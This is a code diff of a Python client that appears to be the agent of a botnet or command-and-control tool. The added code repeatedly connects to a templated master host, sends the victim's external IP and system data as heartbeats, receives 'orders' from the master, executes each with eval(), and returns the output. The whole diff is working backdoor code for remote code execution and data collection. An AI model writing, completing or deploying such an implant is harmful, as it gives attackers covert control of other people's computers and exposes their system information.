@@ -1,12 +1,19 @@
-from tkinter import E
-from core.module_handler import *
-import sys, warnings
-from util.lsb_substitution import module_to_image
+from cProfile import run
+from doctest import master
+import json
 import socket
+import warnings
+import time
+from threading import Thread
+
+from core.module_handler import *
+from util.system_utils import get_external_ip, get_system_data
 
 with warnings.catch_warnings():
     warnings.filterwarnings("ignore", category=DeprecationWarning)
     import imp
+
+results = []
 
 def import_code(code, name):
     module = imp.new_module(name)
@@ -22,20 +29,62 @@ def load_modules(modules_list):
             module = import_code(module_code, module_name)
             globals()[module_name] = module
 
-def run_function(command):
+def run_command(command):
     r = eval(command)
     return r
 
-def main():
-    host = '{HOST}'
-    port = '{PORT}'
-    modules_list = ['mod_test'] # ['{MODULES}']
-    for module in modules_list:
-        module_to_image(module)
+def process_order(order):
+    result = run_command(order)
 
+    if result:
+        results.append(str(result))
+
+def send_heartbeat(s):
+
+    hearbeat_data = {
+        "location": get_external_ip(),
+        "system": get_system_data()
+    }
+    try:
+        s.send(bytes(json.dumps(hearbeat_data), encoding='utf-8'))
+        return True
+    except:
+        return False
+
+
+def listen_master(host, port):
+
+    s = socket.socket()
+
+    try:
+        s.connect((host, port))
+    except:
+        return 
+
+    modules_list = ['{MODULES}']
     load_modules(modules_list)
 
+    while send_heartbeat(s):
+        try:
+            s.settimeout(5)
+            order = s.recv(10000)
+            if order:
+                t = Thread(target=process_order, args=(order.decode(),))
+                t.start()
+        except:
+            pass
+        finally:
+            s.settimeout(None)
+
+        if len(results) > 0:
+            result = results.pop()
+            if result:
+                s.send(bytes(str(result), encoding='utf-8'))
+
 if __name__ == '__main__':
-    main()
-    result = run_function("mod_test.get_time_now()")
-    print(result)
+    while True:
+        host = '{HOST}'
+        port = int('{PORT}')
+
+        listen_master(host, port)
+        time.sleep(10)
